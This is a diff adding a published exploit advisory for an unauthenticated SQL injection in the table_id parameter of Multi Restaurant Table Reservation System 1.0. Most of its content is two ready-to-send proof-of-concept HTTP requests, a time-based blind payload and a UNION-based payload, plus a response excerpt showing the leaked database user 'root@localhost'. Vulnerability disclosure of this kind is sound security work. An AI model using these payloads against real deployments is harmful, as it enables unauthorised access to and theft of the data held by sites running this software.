@@ -1,0 +1,50 @@
+# Title: Multi Restaurant Table Reservation System 1.0 - 'table_id' Unauthenticated SQL Injection
+# Exploit Author: yunaranyancat
+# Date: 02-11-2020
+# Vendor Homepage: www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/tablereservation.zip
+# Version: 1.0
+# Tested On: Ubuntu 18.04 + XAMPP
+
+# Description
+
+The file view-chair-list.php does not perform input validation on the table_id parameter which allows unauthenticated SQL Injection.
+An attacker can send malicious input in the GET request to /dashboard/view-chair-list.php?table_id= to trigger the vulnerability.
+
+# POC N°1 = Time based blind SQLi
+
+GET /TableReservation/dashboard/view-chair-list.php?table_id='+AND+(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+- HTTP/1.1
+Host: [TARGET IP/URL]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+### Server will sleep for 10 seconds before returning the response
+
+# POC N° 2 = UNION based SQLi
+
+### Request (getting current user)
+
+GET /TableReservation/dashboard/view-chair-list.php?table_id=%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176787071%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x71716b7071%29%2CNULL%2CNULL--%20- HTTP/1.1
+Host: [TARGET IP/URL]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Length: 2
+
+### Response
+
+...
+<td class="center hidden-phone">
+<a href="delete-chair.php?chair_id=[REDACTED]root@localhost[REDACTED] class="btn btn-danger"  onclick="if (!Done()) return false; ">Delete Chair</a>
+...
